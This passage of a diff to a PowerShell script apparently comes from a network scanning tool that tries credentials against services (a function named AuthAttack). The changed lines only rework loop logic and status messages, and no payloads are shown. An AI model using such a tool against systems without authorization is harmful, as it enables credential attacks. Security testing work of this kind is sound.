+                    $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
 
-                # Reset the index to start processing from the beginning of the array
-                $index = 0
-            } else {
-                $index++
+                    # Reset the index to start processing from the beginning of the array
+                    $index = 0
+                } else {
+                    $index++
+                }
             }
+
+
+        }
+        else {
+            Write-Host "═════════════════════════════════════════════════════════`r`n"
+            Write-Host "No authentication required, see results above.`r`n"
+            Write-Host "Scan completed.`r`n" -ForegroundColor Green
+            Write-Host "═════════════════════════════════════════════════════════`r`n"
         }
 
-        #return $validCredentials
-
     }
-    else {
-        Write-Host "=========================================================`r`n"
-        Write-Host "No authentication required, see results above.`r`n"
-        Write-Host "Scan completed.`r`n" -ForegroundColor Green
-        Write-Host "=========================================================`r`n"
-    }
+    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
+    Write-Host "═════════════════════════════════════════════════════════`r`n"
 }
+
 
 
 if ($Search) {
@@ -761,7 +1098,7 @@ if ($Search) {
 
         } else {
             Write-Host -NoNewline -ForegroundColor Yellow "[?]"
-			Write-Host " Checking for Valid Paths at Target IP:PORT"
+			Write-Host " Checking Connection and Paths at Target`r`n"
 
             $result = AuthAttack -Target $AuthAttack
     }
